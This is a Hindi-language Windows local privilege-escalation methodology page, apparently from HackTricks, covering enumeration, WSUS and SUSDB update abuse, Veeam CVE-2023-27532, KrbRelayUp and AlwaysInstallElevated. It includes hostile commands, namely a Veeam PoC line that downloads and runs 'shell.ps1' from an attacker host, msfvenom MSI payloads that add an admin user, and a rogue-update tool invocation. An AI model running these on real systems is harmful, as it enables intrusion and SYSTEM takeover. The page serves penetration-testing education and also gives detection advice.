# Windows स्थानीय विशेषाधिकार वृद्धि

{{#include ../../banners/hacktricks-training.md}}

### **Windows स्थानीय privilege-escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

यह पेज कई बुनियादी guides से Windows privilege-escalation की सामान्य methodology को एक जगह संकलित करता है।<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> इसका व्यावहारिक enumeration flow community workshops और checklists पर भी आधारित है।<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> ऐतिहासिक attack सामग्री में Windows privilege escalation पर DerbyCon presentation भी शामिल है।<sup>[[5]](#references)</sup>

## Windows के प्रारंभिक सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows access tokens क्या हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए यह पेज देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows सुरक्षा नियंत्रण

Windows में कई ऐसी चीज़ें हैं जो **आपको system enumerate करने**, executables चलाने, या आपकी गतिविधियों का **पता लगाने** से **रोक सकती हैं**। Privilege-escalation enumeration शुरू करने से पहले, आपको यह **पेज पढ़ना** चाहिए और इन सभी **defense mechanisms को enumerate करना** चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physical access से offline UEFI NVRAM edit को pre-boot DMA और Windows `SYSTEM` memory-patching chain में भी बदला जा सकता है:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के ज़रिए launch किए गए UIAccess processes का दुरुपयोग करके, AppInfo secure-path checks को bypass करने पर prompts के बिना High IL तक पहुँचा जा सकता है। UIAccess/Admin Protection bypass की dedicated workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग करके arbitrary SYSTEM registry write (RegPwn) किया जा सकता है:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

हाल के Windows builds में **SMB arbitrary-port** LPE path भी जोड़ा गया है, जिसमें privileged local NTLM authentication को reused SMB TCP connection पर reflect किया जाता है:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System की जानकारी

### Version की जानकारी का enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लागू किए गए patches भी जाँचें)।

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### वर्ज़न एक्सप्लॉइट्स

Microsoft की सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए यह [साइट](https://msrc.microsoft.com/update-guide/vulnerability) उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो दिखाती हैं कि Windows environment कितना **बड़ा attack surface** प्रस्तुत करता है।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson embedded है)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS build, installed updates और चुने हुए advisory candidates की सूची बनाता है; किसी result को लागू मानने से पहले exact product और superseding updates verify करें।

वर्ज़न-विशिष्ट local exploit के लिए, OS architecture के साथ **चल रहे process का architecture** भी जाँचें। 64-bit Windows पर 32-bit process [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) के अधीन होता है: `%windir%\System32` आम तौर पर 32-bit system directory पर जाता है, जबकि `%windir%\Sysnative` उस process को native system directory तक पहुँच देता है। यह alias 64-bit process के लिए उपलब्ध नहीं है। OS build या missing-KB candidate से exploitability साबित नहीं होती; सटीक issue के लिए [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) के साथ चल रहे build, installed या superseding update, process architecture और exploit prerequisites की तुलना करें।

Service-memory-corruption के उदाहरण के लिए, [client-controlled MIDI shared-memory ring offsets](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions) देखें। प्रकाशित stack offsets केवल tested build पर लागू होते हैं; `LOCAL SERVICE` तक पहुँचना, बाद में `SYSTEM` तक जाने वाले [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) चरण से अलग है।<sup>[[44]](#references)</sup>

**सिस्टम की जानकारी के साथ स्थानीय रूप से**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits के Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई credential/Juicy जानकारी सेव है?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell इतिहास

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript फ़ाइलें

आप [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) में इसे चालू करने का तरीका जान सकते हैं।

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` सिर्फ़ एक उदाहरण है। [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) आम तौर पर हर उपयोगकर्ता के Documents फ़ोल्डर में फ़ाइलें लिखती है, लेकिन `OutputDirectory` सेटिंग या `Start-Transcript -OutputDirectory` फ़ाइलों को किसी साझा या छिपे हुए फ़ोल्डर में भेज सकता है। Transcript की समीक्षा करने से पहले प्रभावी output path और फ़ाइल ACL जाँचें: उसमें command arguments और output हो सकते हैं, जिनमें credentials भी शामिल हैं। पढ़ा जा सकने वाला transcript तभी एक सुराग है, जब उसकी सामग्री किसी ऐसे उपयोगी, उच्च-विशेषाधिकार वाले identity का खुलासा करे जो संबंधित context में log on कर सके।

### PowerShell Module Logging

PowerShell pipeline executions का विवरण दर्ज किया जाता है, जिसमें चलाए गए commands, command invocations और scripts के कुछ हिस्से शामिल होते हैं। हालाँकि, execution का पूरा विवरण और output results शायद दर्ज न हों।

इसे enable करने के लिए, documentation के "Transcript files" section में दिए गए निर्देशों का पालन करें और **"Powershell Transcription"** के बजाय **"Module Logging"** चुनें।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell logs से अंतिम 15 events देखने के लिए आप यह चला सकते हैं:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और संपूर्ण सामग्री का रिकॉर्ड दर्ज किया जाता है, जिससे कोड के हर ब्लॉक को चलते समय दस्तावेज़ित किया जाता है। यह प्रक्रिया हर गतिविधि का व्यापक ऑडिट ट्रेल सुरक्षित रखती है, जो फॉरेंसिक्स और दुर्भावनापूर्ण व्यवहार का विश्लेषण करने के लिए उपयोगी है। निष्पादन के समय सभी गतिविधियों को दस्तावेज़ित करके, प्रक्रिया की विस्तृत जानकारी दी जाती है।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block के logging events Windows Event Viewer में इस path पर देखे जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**।\
अंतिम 20 events देखने के लिए आप यह उपयोग कर सकते हैं:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### इंटरनेट सेटिंग्स

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ड्राइवहरू

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

पहले दिए गए मार्गदर्शन में जोखिम का सार इस प्रकार बताया गया था:

अगर updates को http**S** के बजाय http का उपयोग करके अनुरोधित किया जाता है, तो आप system को compromise कर सकते हैं।

HTTP WSUS endpoint, update metadata को intercept करने की संभावना की जांच करने का संकेत है। Exploitation इस बात पर भी निर्भर करता है कि client उस WSUS server का उपयोग करता है या नहीं, attacker उसके traffic को intercept या control कर सकता है या नहीं, और client की update trust तथा installation policy क्या है। केवल URL से code execution सिद्ध नहीं होता। [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

आप सबसे पहले cmd में निम्नलिखित चलाकर जांचते हैं कि network non-SSL WSUS update का उपयोग करता है या नहीं:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

या PowerShell में निम्नलिखित:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

अगर आपको इनमें से किसी एक जैसा जवाब मिले:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` है।

मूल applicability कथन यह था:

तब, **इसका exploit किया जा सकता है।** यदि अंतिम registry का मान `0` है, तो WSUS entry को अनदेखा किया जाएगा।

जब `UseWUServer` का मान `1` होता है, तो Windows Update कॉन्फ़िगर की गई intranet service का उपयोग करता है। इससे HTTP interception path के लिए एक prerequisite की पुष्टि होती है, लेकिन इससे यह साबित नहीं होता कि interception, malicious update की स्वीकृति या elevated installation संभव है। जब इसका मान `0` होता है, तो उस policy द्वारा यह विशिष्ट कॉन्फ़िगर किया गया WSUS endpoint नहीं चुना जाता।

इन vulnerabilities का exploit करने के लिए आप [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) जैसे tools का उपयोग कर सकते हैं—ये non-SSL WSUS traffic में 'fake' updates inject करने वाली MiTM weaponized exploit scripts हैं।

यहाँ research पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूरी report यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
मूल रूप से, यह वह flaw है जिसका यह bug exploit करता है:

> यदि हमारे पास अपने local user proxy को modify करने की अनुमति है, और Windows Updates Internet Explorer की settings में कॉन्फ़िगर किए गए proxy का उपयोग करता है, तो हमारे पास अपने asset पर locally [PyWSUS](https://github.com/GoSecure/pywsus) चलाकर अपने ही traffic को intercept करने और elevated user के रूप में code चलाने की क्षमता होगी।
>
> इसके अलावा, चूँकि WSUS service वर्तमान user की settings का उपयोग करती है, इसलिए यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए self-signed certificate generate करके उसे वर्तमान user के certificate store में जोड़ते हैं, तो हम HTTP और HTTPS, दोनों WSUS traffic को intercept कर पाएँगे। Certificate पर trust-on-first-use प्रकार का validation लागू करने के लिए WSUS किसी HSTS-जैसी mechanism का उपयोग नहीं करता। यदि user प्रस्तुत certificate पर भरोसा करता है और उसका hostname सही है, तो service उसे स्वीकार कर लेगी।

आप [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool का उपयोग करके इस vulnerability का exploit कर सकते हैं (जब यह उपलब्ध हो जाए)।

### WSUS administrator द्वारा नियंत्रित updates

एक अलग path तब मौजूद होता है जब वर्तमान identity किसी WSUS server पर updates **publish और approve** कर सकती है। Server के `WSUS Administrators` group की effective membership और किसी भी delegated WSUS permissions की जाँच करें, फिर उस client computer group की पहचान करें जिसे approved update प्राप्त होगा। [Microsoft updates approve करने के लिए WSUS Administrator privileges आवश्यक बताता है](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), और [publishing trust relationship का दस्तावेज़ देता है](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): clients को locally published content के लिए उपयोग किए गए signing certificate पर भरोसा करना चाहिए। इसे escalation path मानने से पहले पुष्टि करें कि candidate update signed और accepted है, target पर लागू होता है, और अधिक privileged context में install होता है। केवल HTTP `WUServer` value या group name से इन शर्तों की पुष्टि नहीं होती।

### SUSDB custom-update abuse: `.txt`/`.esd` के ज़रिए unsigned payloads

यह HTTP WSUS connection को intercept करने से अलग trust-boundary failure है: इसके लिए **WSUS database (`SUSDB`) stored procedures** तक इतनी access आवश्यक है कि custom update publish और approve किया जा सके। एक व्यावहारिक entry path में upstream WSUS computer account को उस अलग MSSQL server पर relay करना शामिल है जो `SUSDB` host करता है; सटीक prerequisite deployment पर निर्भर करता है, इसलिए SQL administrator rights मान लेने के बजाय पहले `EXECUTE` permissions enumerate करें।<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530 से LDAP, SMB या AD CS तक WSUS client authentication relay करने वाले अलग attack path के लिए, [NTLM relay के लिए WSUS HTTP का दुरुपयोग](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) देखें।

#### External-database relay और procedure rights की पुष्टि करें

जिन deployments में WSUS external SQL Server का उपयोग करता है, वहाँ पहले जाँचें कि WSUS server account database पर authenticate कर सकता है या नहीं, और NTLM relay उस listener तक पहुँचता है या नहीं। Server की SQL role update-publishing procedures तक पहुँच दे सकती है, भले ही direct table writes अस्वीकृत हों; `SUSDB` पर `UPDATE` विफल होने से यह साबित नहीं होता कि publishing अवरुद्ध है। Custom update का प्रयास करने से पहले authorized SQL session में effective identity, role membership और procedure permissions की जाँच करें।<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Live procedure definitions और installed `SoftwareDistributionPackage.xsd` valid update metadata को फिर से बनाने में उपयोगी हैं। Bundle parent और payload child, दोनों को `UpdateIdentity` (fragment type `1`), `LocalizedProperties` (`4`) और `ExtendedProperties` (`2`) की आवश्यकता होती है; हर `spImportUpdate` call से लौटाया गया local revision ID दर्ज करें और bundle relationship, digests, size, content URL तथा revision को एकसमान रखें। यह stateful publishing workflow है, इसलिए stored procedure का एक सफल call client-side execution का प्रमाण नहीं है।<sup>[[38]](#references)</sup>

#### Update बनाएँ, target करें और approve करें

Custom-update workflow, सीमित publishing API के रूप में legitimate WSUS procedures का उपयोग करता है। महत्वपूर्ण state transitions ये हैं:<sup>[[38]](#references)</sup>

| चरण | संबंधित stored procedures |
| --- | --- |
| Update metadata import करें | `spImportUpdate` |
| Prerequisite, localized और extended XML fragments store करें | `spSaveXMLFragment` |
| Content digest को attacker-controlled URL से associate करें | `spSetBatchURL` |
| Computer group सूचीबद्ध करें/बनाएँ और client जोड़ें | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| उस group के लिए installation approve करें | `@actionID = 0` और `@isAssigned = 1` के साथ `spDeployUpdate` |

File name, digests, size और `CommandLineInstallation` handler, imported metadata/fragments में एक-दूसरे से मेल खाने चाहिए। Content URL और target group assign करने के बाद, अंतिम approval कुछ इस तरह होता है; उदाहरण के GUIDs को दोबारा इस्तेमाल करने के बजाय नए update, group और deployment identifiers इस्तेमाल करें।<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS सामान्यतः मनमाने unsigned executable content को अस्वीकार करता है। हालांकि, `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` में .NET का `VerifyFile` path, दिए गए filename के `.txt` या `.esd` पर समाप्त होने पर certificate-check flag को false कर देता है; `CheckCertificateSignature` को यह साबित किए बिना छोड़ दिया जाता है कि bytes टेक्स्ट हैं या कोई वैध ESD image। इसलिए `payload.exe.txt` नाम वाला PE बिना किसी बदलाव के content verification पास कर सकता है और बाद में update के command-line installation handler द्वारा launch किया जा सकता है। यह policy/type-confusion bug है, signature forgery नहीं।<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-compatible staging और automation

`spDeployUpdate` को call करने से WSUS registered content fetch करता है। Origin को BITS की HTTP अपेक्षाएँ पूरी करनी होंगी: केवल reachable URL पर्याप्त नहीं है, क्योंकि transfer में शुरुआती `HEAD`/`GET` flow और byte-range requests का उपयोग होता है। Range support के बिना server होने पर WSUS synchronization `EventId=364` में यह संदेश देता है कि BITS को Range protocol header की आवश्यकता है।<sup>[[39]](#references)</sup>

Research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) import/fragment/URL/group/deployment chain के लिए ज़रूरी SQL generate करता है, उसे execute करने के लिए modified MSSQL client शामिल करता है और content staging के लिए `BitsWebServer.py` देता है। अधिकृत lab में इसका एक न्यूनतम invocation है:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unattended execution and retry persistence

Client-side interaction नीति पर निर्भर करती है। `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` में विकल्प `4 - Auto download and schedule install` चुनने से स्वीकृत update, उपयोगकर्ता द्वारा उसे मैन्युअल रूप से चुने बिना, कॉन्फ़िगर किए गए शेड्यूल के अनुसार डाउनलोड और इंस्टॉल होता है। परीक्षण में, callback process के exit होने के तुरंत बाद ऐसा payload, जिसका update विफल/अधूरा रहा था, फिर से पेश किया गया। इसलिए retry behavior बार-बार होने वाली execution persistence बन सकता है; यह शोर पैदा करता है, क्योंकि client पर update-failed state दिखाई देती है।<sup>[[39]](#references)</sup>

#### Detection और hardening के उपयोगी बिंदु

इस chain से जुड़े उपयोगी server- और client-side बिंदु ये हैं:<sup>[[39]](#references)</sup>

- `SUSDB` में `spCreateTargetGroup`, `spSetBatchURL` और `spDeployUpdate` के execution का audit करें; नए targeting groups, external content origins, `.txt`/`.esd` update payloads और अप्रत्याशित principals (विशेषकर non-computer accounts) द्वारा किए गए deployments की जाँच करें।
- `C:\Program Files\Update Services\LogFiles` में `ContentSyncAgent`, `FileVerified`, गलत वर्तनी वाले `FileVerficationFailed` और `EventId=364` खोजें; verification को payload extension और content magic से मिलाएँ, suffix पर भरोसा न करें।
- ऐसे Windows Update installations खोजें जो बार-बार विफल हो रहे हों या retry कर रहे हों। साथ ही, `.txt` या `.esd` नाम वाले content से PE execution या अप्रत्याशित child/network activity की जाँच करें।
- जहाँ समर्थित हो, database service के लिए Extended Protection for Authentication अनिवार्य करें और database network access को WSUS server तथा अधिकृत administrative systems तक सीमित रखें। Custom-update procedures पर `EXECUTE` rights कम से कम रखें और उनका audit करें।

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents localhost IPC surface और privileged update channel उपलब्ध कराते हैं। यदि enrollment को attacker server की ओर मोड़ा जा सके और updater किसी rogue root CA या कमज़ोर signer checks पर भरोसा करता हो, तो local user एक malicious MSI भेज सकता है, जिसे SYSTEM service इंस्टॉल कर देती है। सामान्यीकृत technique (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

मूल version-specific विवरण और reconnaissance note इस प्रकार थे:

Veeam B&R < `11.0.1.1261` में **TCP/9401** पर एक localhost service उपलब्ध है, जो attacker-controlled messages को process करती है और **NT AUTHORITY\SYSTEM** के रूप में arbitrary commands चलाने देती है।<sup>[[12]](#references)</sup>

- **Recon**: listener और version की पुष्टि करें, जैसे `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` से।

Veeam Backup & Replication और Cloud Connect, **TCP/9401 by default** पर core backup service का उपयोग करते हैं। [Veeam की advisory](https://www.veeam.com/kb4424) backup network perimeter के भीतर encrypted configuration-database credentials को बिना authentication उजागर किए जाने का वर्णन करती है; एक अलग public PoC, **NT AUTHORITY\SYSTEM** के रूप में command-execution path दिखाता है।<sup>[[12]](#references)</sup> Service localhost से आगे भी bind हो सकती है, इसलिए इसका वास्तविक address और PID जाँचें।

- **Recon**: पुष्टि करें कि TCP/9401, `Veeam.Backup.Service.exe` का है, फिर installed product और patch metadata की जाँच करें। `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` संकेत हैं, patch की पूरी जाँच नहीं।
- **Fixed floors**: Veeam, **11a build 11.0.1.1261 P20230227** और **12 build 12.0.0.1420 P20230223** को पहले fixed releases के रूप में सूचीबद्ध करता है; इससे पहले के releases प्रभावित हैं। केवल चार भागों वाला file version, उन्हीं build numbers पर unpatched base build और बाद के patch में अंतर नहीं बता सकता। किसी boundary build को fixed घोषित करने से पहले patch identifier की पुष्टि [vendor build history](https://www.veeam.com/kb2680) से करें।
- **Exploit**: आवश्यक Veeam DLLs के साथ `VeeamHax.exe` जैसे PoC को उसी directory में रखें, फिर local socket पर SYSTEM payload trigger करें:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

सेवा SYSTEM के रूप में कमांड चलाती है।

उद्धृत PoC दिखाता है कि इसकी अतिरिक्त पूर्वापेक्षाएँ पूरी होने पर कमांड SYSTEM के रूप में चलाई जा सकती है; विक्रेता की advisory credential-disclosure समस्या का वर्णन करती है।

## KrbRelayUp

डिफ़ॉल्ट environment के मूल विवरण में कहा गया था:

विशिष्ट परिस्थितियों में Windows **domain** environments में **local privilege escalation** की vulnerability मौजूद होती है। इन परिस्थितियों में ऐसे environments शामिल हैं जहाँ **LDAP signing लागू नहीं है,** users के पास ऐसे self-rights हैं जिनसे वे **Resource-Based Constrained Delegation (RBCD)** configure कर सकते हैं, और users domain में computers बना सकते हैं। ध्यान दें कि **default settings** में ये **requirements** पूरी होती हैं।

स्थानीय Kerberos relay, कम privileged logon से privileged directory write तक पहुँच सकता है, जब कोई उपयुक्त COM server authenticate करे और relayed principal के पास target object पर अधिकार हों। [KrbRelay documents](https://github.com/cube0x0/KrbRelay) RBCD और `msDS-KeyCredentialLink` (shadow-credential) LDAP writes—दोनों का समर्थन करता है; KrbRelayUp इनमें से कुछ paths को automate करता है। RBCD chain के लिए लागू delegation और target-object rights आवश्यक हैं, जबकि shadow-credential chain के लिए key-credential write rights और certificate authentication path को support करने वाला KDC आवश्यक है। इनमें से कोई भी path केवल domain membership से उपलब्ध नहीं होता।

वास्तविक DC की [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) और [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) policy, relayed identity की object ACL, और चुनी गई COM class के authentication तथा impersonation levels की जाँच करें। Caller का logon type और credential context मायने रखते हैं: WinRM session का व्यवहार interactive या new-credentials logon से अलग हो सकता है। Firewall/OXID routing और installed updates भी नतीजा बदल सकते हैं। किसी permissive policy या matching ACL को review candidate मानें; passive enumeration से COM coercion, relay authentication या directory writes शुरू नहीं होने चाहिए। Machine-account shadow credential से machine ticket मिल सकता है और, केवल तभी जब उस account के पास आवश्यक directory replication rights हों, अलग DCSync path भी मिल सकता है।

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) में **exploit** खोजें।

Attack के flow के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**यदि** ये 2 registry keys **enabled** हों (value **0x1** हो), तो किसी भी privilege वाले users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

यदि आपके पास meterpreter session है, तो आप **`exploit/windows/local/always_install_elevated`** module का उपयोग करके इस तकनीक को automate कर सकते हैं।

### PowerUP

power-up से `Write-UserAddMSI` command का उपयोग करके मौजूदा directory में privileges escalate करने के लिए Windows MSI binary बनाएँ। यह script एक precompiled MSI installer बनाती है, जो user/group जोड़ने के लिए prompt दिखाता है (इसलिए आपको GIU access की आवश्यकता होगी):

```
Write-UserAddMSI
```

बस privileges escalate करने के लिए बनाई गई binary execute करें।

### MSI Wrapper

इस tool का उपयोग करके MSI wrapper बनाने का तरीका जानने के लिए यह tutorial पढ़ें। ध्यान दें कि अगर आप सिर्फ **command lines** **execute** करना चाहते हैं, तो आप "**.bat**" file को wrap कर सकते हैं।

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX से MSI बनाएं


{{#ref}}
create-msi-with-wix.md
